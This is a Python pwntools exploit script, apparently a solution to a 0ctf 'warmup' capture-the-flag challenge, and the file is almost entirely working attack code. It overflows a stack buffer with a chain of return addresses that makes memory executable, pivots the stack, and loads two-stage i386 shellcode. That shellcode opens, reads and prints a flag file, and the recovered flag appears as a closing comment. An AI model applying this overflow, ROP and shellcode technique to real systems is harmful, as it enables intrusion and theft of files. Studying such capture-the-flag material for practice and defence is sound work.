from pwn import *
context.log_level = 'error'

r = remote('localhost', 4000)
r.recv()
# r = process('./warmup')


main = 0x080480D8
main2 = 0x080480E2
bss = 0x08049000
read = 0x0804811D
addesp30 = 0x080481B8
alarm = 0x0804810D

syscall = 0x08048122

fill = 0
# remember we can use at most 5
# dwords including ret addr

payload = 'A'*0x20
payload += p32(main)  # now we have 125 in eax
payload += p32(0x1000)
payload += p32(
    constants.PROT_READ |
    constants.PROT_EXEC |
    constants.PROT_WRITE)
payload += p32(fill)
payload += p32(fill)

r.send(payload)
r.recv()


payload = 'A'*0x20
payload += p32(main)  # now we have 125 in eax
payload += p32(fill)
payload += p32(syscall)
payload += p32(bss)
payload += p32(bss)

r.send(payload)
r.recv()

payload = 'A'*0x20
payload += p32(main)  # now we have 125 in eax
payload += p32(fill)
payload += p32(fill)
payload += p32(fill)
payload += p32(fill)


r.send(payload)
r.recv()

payload = 'A'*0x20
payload += p32(main)  # now we have 125 in eax
payload += p32(fill)
payload += p32(fill)
payload += p32(fill)
payload += p32(fill)

r.send(payload)
r.recv()

payload = 'A'*0x20
payload += p32(read)  # now we have 125 in eax
payload += p32(addesp30)  # pivot stack
payload += p32(0)
payload += p32(bss)
payload += p32(125)

r.send(payload)
r.recv()
r.recv()

l = 125
stage1 = asm(
    pwnlib.shellcraft.i386.linux.syscall(
               'SYS_read', 0, bss+l, 4096-l))
stage1 += asm('push {}; ret'.format(bss+l))
stage1 = stage1.ljust(125, '\x90')
assert len(stage1) == l

r.send(stage1)


stage2 = asm(
    pwnlib.shellcraft.i386.pushstr('/home/warmup/flag'))
stage2 += asm(
    '''
      mov ebx, esp
      mov ecx, 0
      mov edx, 0
      mov eax, SYS_open      # open
      int 0x80

      mov ebx, eax
      mov eax, SYS_read      # read content
      lea ecx, [esp-0x30]
      mov edx, 40
      int 0x80

      mov eax, SYS_write
      mov ebx, 1
      lea ecx, [esp-0x30]
      mov edx, 40
      int 0x80

      mov eax, 1
      int 0x80
''')

r.send(stage2)

flag = r.recv()
print flag
#  0ctf{welcome_it_is_pwning_time}
